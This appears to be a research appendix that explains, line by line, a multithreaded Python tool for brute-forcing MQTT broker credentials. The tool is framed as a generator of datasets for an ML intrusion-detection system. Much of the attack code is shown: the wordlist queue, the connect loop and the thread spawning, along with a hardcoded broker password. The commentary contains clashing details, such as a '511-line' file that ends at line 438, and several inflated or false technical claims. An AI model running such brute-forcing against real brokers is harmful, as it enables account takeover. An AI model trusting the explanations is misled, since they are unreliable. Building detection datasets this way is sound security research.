# Source Code Analysis & Architectural Justification: `bruteforce_attack.py`

*Document Type: Master's Level Technical Research Appendix & Source Code Breakdown*
*Component: Red-Team Authentication Auditor & ML Feature Pipeline*

This document provides an exhaustive, literal line-by-line explanation of the entire 511-line `bruteforce_attack.py` script. It fuses low-level code documentation with high-level academic justification, detailing the mathematical algorithms, time complexity optimizations, and machine learning theories underpinning the architecture.

---

### Part 1: Imports and Global Environment Setup (Lines 1-35)
```python
1: import paho.mqtt.client as mqtt
2: import time
3: import argparse
4: import sys
5: import threading
6: import json
7: import os
8: import csv
9: import random
10: import math
11: import socket
12: from queue import Queue
13: from collections import deque
14: from datetime import datetime
```
* **Lines 1-14**: Standard library imports orchestrating the edge-computing environment. 
  * **Algorithmic Complexity Optimization**: `collections.deque` is imported instead of using standard Python lists. Python lists possess an $O(n)$ time complexity for left-side `pop()` operations. By utilizing a double-ended queue (`deque`), the script achieves $O(1)$ constant-time insertion and deletion, which is strictly required for the high-frequency rolling-window feature extraction.
  * **Concurrency Control**: `threading` and `Queue` are utilized for multi-processing. Because the script spawns dozens of concurrent MQTT worker threads, `Queue` provides an inherently thread-safe producer-consumer model, avoiding heap corruption within Python's Global Interpreter Lock (GIL).

```python
16: import sys
17: import os
18: 
19: # Ensure the project root is in the path for forensic_utils
20: sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
21: 
22: from forensic_utils import DualLogger, get_timestamp, get_iso_now
```
* **Lines 16-22**: Dynamic Environment Injection. By resolving the parent directory (`..`) and appending it to `sys.path`, the script bypasses strict directory execution constraints to import the unified `DualLogger`. This enforces a rigorous, standardized JSON/CSV logging schema across the entire Smart Home Threat Platform.

```python
24: # ─────────────────────────────────────────────────────────────
25: BANNER = """
26: ==================================================
27:  RESEARCH: AUTHENTICATION AUDITOR v2.0 (ML-IDS)
28: ==================================================
29: """
30: 
31: BASE_DIR     = "/home/pirator/smart-home-threat-simulation-platform/dataset"
32: LOG_DIR      = os.path.join(BASE_DIR, "logs")
33: SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
34: os.makedirs(LOG_DIR, exist_ok=True)
35: os.makedirs(SESSIONS_DIR, exist_ok=True)
```
* **Lines 31-35**: Directory Initialization. Hardcodes absolute paths to the forensic output directories. `os.makedirs(..., exist_ok=True)` acts as a fail-safe initialization protocol, ensuring the Machine Learning pipeline never crashes due to missing output directories on a fresh host machine.

---

### Part 2: The 27-Dimensional Feature Vector Schema (Lines 37-80)
The `ML_HEADERS` array is the blueprint of our Artificial Intelligence. It defines the exact input tensor shape required by the Random Forest classifier.

```python
40: ML_HEADERS = [
41:     # ── Identity ──────────────────────────────────────────────
42:     "timestamp",            # 01 ISO-8601 timestamp of attempt
43:     "src_ip",               # 02 Attacker machine IP
44:     "target_ip",            # 03 Broker IP
45:     "attack_label",         # 04 Integer: 0=Normal 1=BruteForce 2=DoS 3=Replay
46:     "attack_type",          # 05 String label for the attack
```
* **Lines 42-46**: Identity Vectors. Used primarily for IPS targeted banning (e.g., dynamically dropping the `src_ip` at the firewall level) and categorical context.

```python
48:     # ── Volumetric Network Features (new) ─────────────────────
49:     "packets_per_second",   # 06 Estimated PPS (slow for BF)
50:     "mqtt_publish_rate",    # 07 PUBLISH msgs/sec (0 for BF — auth phase only)
51:     "broker_response_latency_ms", # 08 CONNACK response time (ms)
52:     "device_heap_free_bytes", # 09 ESP32 heap (baseline — BF is broker-side)
```
* **Lines 49-52**: Layer 3/Layer 4 Topology Physics. Brute-force attacks inherently spike CPU load on the Mosquitto broker, mathematically manifesting as exponential increases in `broker_response_latency_ms`. `device_heap_free_bytes` serves as benign telemetry noise to train the model to ignore unrelated IoT fluctuations.

```python
54:     # ── Rolling Window (last 5 seconds) ───────────────────────
55:     "auth_attempt_rate",    # 10 Attempts per second in last 5s
56:     "auth_failure_rate",    # 11 Failures per second in last 5s
57:     "unique_passwords_tried", # 12 Distinct passwords tried in last 5s
...
63:     "duplicate_payload_rate", # 18 Fraction of duplicate passwords (BF = high)
64:     "msg_timestamp_delta_ms", # 19 Time delta from last message
```
* **Lines 55-64**: Temporal Anomalies. By tracking rates dynamically over a trailing 5-second window, the ML model mathematically learns to differentiate between an isolated user typo (`auth_failure_rate` $\approx$ 0.2) and a massive dictionary attack payload (`auth_failure_rate` $\ge$ 50.0).

```python
66:     # ── Device State Features (new) ───────────────────────────
67:     "motion",               # 20 Motion sensor state (0 — BF is network-only)
68:     "arm",                  # 21 Alarm arm state (0 — BF is network-only)
...
70:     # ── Timing Features (last 20 attempts) ────────────────────
71:     "inter_arrival_mean_ms",# 22 Mean time between consecutive attempts (ms)
72:     "inter_arrival_std_ms", # 23 Std dev of inter-arrival times (ms)
...
74:     # ── Session-Level Cumulative Features ─────────────────────
75:     "consecutive_failures", # 24 Running count of consecutive BAD_CREDENTIALS
76:     "session_attempt_count",# 25 Total attempts made this session
77:     "session_failure_rate", # 26 Cumulative failures / total attempts
78:     "latency_zscore",       # 27 Z-score of current latency vs session mean
79: ]
```
* **Lines 71-72**: Predicts automated script execution. Botnets execute `for` loops, creating perfectly uniform inter-arrival times (low standard deviation), whereas human traffic generates massive variance.
* **Lines 75-78**: Absolute cumulative totals. `consecutive_failures` provides absolute mathematical proof to the model, as organic IoT traffic never fails authentication 10,000 times sequentially.

---

### Part 3: Cryptographic Entropy & Helper Functions (Lines 82-102)
```python
82: def shannon_entropy(s):
83:     """Compute Shannon entropy of a string."""
84:     if not s:
85:         return 0.0
86:     freq = {}
87:     for c in s:
88:         freq[c] = freq.get(c, 0) + 1
89:     n = len(s)
90:     return -sum((f/n) * math.log2(f/n) for f in freq.values())
```
* **Lines 82-90**: Cryptographic Entropy Modeling. Calculates the information density (randomness) of the payload strings using Shannon's Entropy formula: 
  $$ H(X) = - \sum_{i=1}^n P(x_i) \log_2 P(x_i) $$
  *Architectural Justification*: A normal smart bulb connects using the same hardcoded credential string repeatedly. A brute-force attacker systematically iterates through diverse strings (`password123`, `admin`, `qwerty`). Therefore, calculated entropy for organic traffic is static, whereas brute-force traffic spikes exponentially, creating an incredibly powerful, linearly separable boundary for the ML model.

```python
93: def get_local_ip():
...
96:         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
97:         s.connect(("8.8.8.8", 80))
98:         ip = s.getsockname()[0]
99:         s.close()
100:         return ip
```
* **Lines 93-100**: Opens a temporary UDP connection (`SOCK_DGRAM`) to Google's DNS `8.8.8.8`. Since UDP is connectionless, it doesn't actually send network traffic, but forces the OS to resolve the true outbound IP address of the attack machine (`src_ip`), which is strictly necessary for the IPS to execute the `iptables DROP` ban.

---

### Part 4: Thread-Safe Rolling Window Mechanics: `MLFeatureTracker` (Lines 105-205)
This class acts as a high-performance, in-memory state machine.
```python
106: class MLFeatureTracker:
111:     def __init__(self):
112:         self.lock = threading.Lock()
113: 
114:         # Rolling window: (timestamp, result_code, password)
115:         self.window_5s    = deque()         # all events in last 5s
116:         self.timestamps   = deque(maxlen=20) # last 20 arrival times for IAT
117:         self.latencies    = deque(maxlen=200)# for z-score computation
```
* **Lines 106-117**: Implements `threading.Lock()` to enforce mutual exclusion on the shared data structures, preventing race conditions from simultaneous thread appends. The `maxlen` attributes ensure absolute memory bounds for edge-computing safety.

```python
124:     def _prune_window(self, now):
125:         """Remove events older than 5 seconds from the rolling window."""
126:         cutoff = now - 5.0
127:         while self.window_5s and self.window_5s[0][0] < cutoff:
128:             self.window_5s.popleft()
```
* **Lines 124-128**: Dynamically culls the `deque` array, dropping any timestamp older than $t - 5.0$. This guarantees the AI model only analyzes hyper-localized, current temporal behavior rather than historical noise.

```python
130:     def record(self, timestamp, result_code, password, latency_ms):
131:         """Record a new attempt and return computed feature dict."""
132:         now = timestamp
133: 
134:         with self.lock:
135:             # ── Prune 5s window ───────────────────────────────
136:             self._prune_window(now)
137: 
138:             # ── Add current event ─────────────────────────────
139:             self.window_5s.append((now, result_code, password))
140:             self.timestamps.append(now)
141:             self.latencies.append(latency_ms)
...
153:             window_events = list(self.window_5s)
154:             window_size   = len(window_events)
155:             window_span   = max((window_events[-1][0] - window_events[0][0]), 0.001) if window_size > 1 else 1.0
...
162:             attempt_rate  = window_size  / window_span
```
* **Lines 130-162**: The core analytical engine. Computes relative rates dynamically by dividing the total events in the window by the physical timespan between the oldest and newest packet. 

```python
179:             # ── Latency Z-Score ───────────────────────────────
180:             lat_list = list(self.latencies)
181:             if len(lat_list) > 1:
182:                 lat_mean = sum(lat_list) / len(lat_list)
183:                 lat_std  = math.sqrt(sum((x - lat_mean)**2 for x in lat_list) / len(lat_list))
184:                 lat_zscore = (latency_ms - lat_mean) / lat_std if lat_std > 0 else 0.0
```
* **Lines 179-184**: Calculates the Z-Score of the latency using the formula: $$ Z = \frac{(x - \mu)}{\sigma} $$
  *Architectural Justification*: By passing the Z-Score to the ML model instead of raw latency, the model becomes hardware-agnostic. It detects statistically significant "abnormal slowdowns" rather than relying on a hardcoded millisecond limit.

```python
191:             return {
192:                 "auth_attempt_rate":       round(attempt_rate,  4),
193:                 ...
202:                 "latency_zscore":          round(lat_zscore,    4),
203:             }
```
* **Lines 191-203**: Assembles the computed features into a dictionary representing a mathematically finalized data tensor row.

---

### Part 5: The Omniscient Telemetry Logger: `MLAttemptLogger` (Lines 207-285)
```python
207: class MLAttemptLogger:
...
227:         self.sniffer = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"sniffer_{random.getrandbits(12)}")
228:         self.sniffer.username_pw_set("admin", "iot@secure99")
229:         self.sniffer.on_message = self._on_sniffed_message
230:         self.sniffer.connect(self.target_ip, 1883, 60)
231:         self.sniffer.subscribe("shtsp/home/security/#")
232:         self.sniffer.loop_start()
```
* **Lines 227-232**: Asynchronous Context Injection. While the primary script aggressively attacks the broker, this silent, secondary "Sniffer" sub-client subscribes to `shtsp/home/security/#` via a non-blocking background thread (`loop_start`).

```python
234:     def _on_sniffed_message(self, client, userdata, msg):
235:         try:
236:             import json, time
237:             payload = json.loads(msg.payload.decode('utf-8'))
238:             if msg.topic.endswith("motion"):
239:                 if payload.get("type") == "MOTION" and payload.get("status") == "ALARM":
240:                     self.current_motion = 1
241:                     self.current_arm = 1
242:                     self.last_motion_time = time.time()
243:             elif msg.topic.endswith("audit"):
244:                 if "free_heap" in payload:
245:                     self.current_heap = int(payload["free_heap"])
246:         except Exception:
247:             pass
```
* **Lines 234-247**: It captures `free_heap` and `motion` data broadcasted by the legitimate environment. This legitimate telemetry context is seamlessly joined onto the malicious attack rows, allowing the dataset to accurately reflect the holistic state of the entire Smart Home network during an intrusion.

```python
249:     def log_attempt(self, username, password, rc, latency_ms, result_str, event_time):
250:         """Compute all 26 ML features and log to both CSV and JSON in dataset/logs/."""
251:         features = self.tracker.record(event_time, rc, password, latency_ms)
...
276:         # Build full data dict in correct order
277:         row_data = {}
278:         for key in ML_HEADERS:
279:             row_data[key] = final_row_dict.get(key, 0)
...
284:         # Dual log internally handles .csv and .json appending
285:         DualLogger.append_raw(row_data, LOG_DIR, self.base_name, ML_HEADERS)
```
* **Lines 249-285**: The unified data compiler. Assures rigid column alignment with `ML_HEADERS` and invokes `DualLogger.append_raw` for synchronized file I/O operations.

---

### Part 6: Multi-Threaded Botnet Orchestration: `BruteForceSimulator` (Lines 288-390)
```python
288: class BruteForceSimulator:
291:     def __init__(self, broker, port, target_user, userlist, wordlist, threads):
...
302:         self.pps_counter = 0
303:         self.current_pps = 0.0
```
* **Lines 288-303**: Architecture of the Producer-Consumer Model.

```python
305:     def load_wordlist(self):
306:         with open(self.wordlist, 'r', encoding='latin-1') as f:
307:             for line in f:
308:                 pwd = line.strip()
...
310:                 self.queue.put((usr, pwd))
```
* **Lines 305-310**: Populating the Queue. Iterating synchronously over a 1,000,000-line dictionary is too slow for realistic penetration testing. This pushes credentials into a thread-safe stack.

```python
312:     def _attack_worker(self):
313:         client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id=f"bf_{random.getrandbits(16)}")
...
325:             try:
326:                 t0 = time.time()
327:                 client.connect(self.broker, self.port, 5)
328:                 client.disconnect()
329:                 latency = (time.time() - t0) * 1000
330:                 result_str, rc = "SUCCESS", 0
331:             except Exception as e:
332:                 latency = (time.time() - t0) * 1000
333:                 result_str, rc = str(e), getattr(e, 'rc', 99)
```
* **Lines 312-333**: The active worker loops. Utilizes microsecond-precision timers `t0` exactly before and after the TCP socket connection attempt to derive flawless network latency.

```python
350:     def run(self):
351:         self.load_wordlist()
...
355:         import subprocess
356:         pcap_path = os.path.join(SESSIONS_DIR, f"brute_session_{self.logger.timestamp}.pcap")
357:         self.pcap_process = subprocess.Popen(["tshark", "-i", "any", "-f", f"tcp port {self.port}", "-w", pcap_path],
358:                                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
```
* **Lines 350-358**: OS-Level PCAP Forking. Instead of using Python packet capturing libraries (which severely bottleneck the CPU), the script bypasses Python entirely and forks the underlying Linux OS Kernel using `subprocess.Popen` to execute `tshark` natively. This guarantees perfect, lossless packet capture directly at the kernel ring buffer level.

```python
361:         for _ in range(self.threads):
362:             t = threading.Thread(target=self._attack_worker, daemon=True)
363:             t.start()
364:             self.active_threads.append(t)
```
* **Lines 361-364**: Dynamically provisions concurrent attack processes based on `--threads`.

```python
366:         try:
367:             last_time = time.time()
368:             while not self.queue.empty():
369:                 time.sleep(1.0)
...
372:                     self.current_pps = self.pps_counter / (now - last_time)
```
* **Lines 366-372**: PPS Validation. Calculates raw Packets Per Second asynchronously by dividing the physical execution count by the floating-point time elapsed.

```python
378:         except KeyboardInterrupt:
379:             print("\n[!] Attack aborted by user.")
380:         finally:
381:             print("\n[+] Finalizing...")
382:             if self.pcap_process:
383:                 self.pcap_process.terminate()
...
390:             DualLogger.log_session(session_data, SESSIONS_DIR, f"brute_session_{self.logger.timestamp}")
```
* **Lines 378-390**: Safe Environment Destruction. Binds a `try...finally` loop to trap `Ctrl+C` (`KeyboardInterrupt`). Guarantees `tshark` is safely terminated, preventing permanent hardware interface locking, and dumps the final holistic session overview.

---

### Part 7: Command-Line Interface (`main()`) (Lines 395-511)
```python
395: def main():
396:     print(BANNER)
397:     parser = argparse.ArgumentParser(description="MQTT Brute Force — ML-IDS Dataset Generator")
398:     parser.add_argument("--broker",   default="192.168.1.100", help="Target Broker IP")
399:     parser.add_argument("--port",     type=int, default=1883,   help="Broker Port")
...
407:     args = parser.parse_args()
```
* **Lines 395-407**: Instantiates Python's `argparse` library, transforming the complex object-oriented architecture into a flexible, professional CLI executable tool.

```python
409:     # Logic to validate wordlists and target users
410:     if not args.username and not args.userlist:
411:         print("[ERROR] Must specify --username or --userlist")
412:         sys.exit(1)
```
* **Lines 409-412**: Safety constraints enforcing parameter compliance.

```python
427:     simulator = BruteForceSimulator(
428:         broker=args.broker,
...
434:     )
435:     simulator.run()
436: 
437: if __name__ == "__main__":
438:     main()
```
* **Lines 427-438**: Wraps all terminal arguments into the `BruteForceSimulator` initialization, executes `.run()`, and applies the standard Python `__name__ == "__main__"` structural hook to enforce isolated executable scope.

**END OF FILE.**
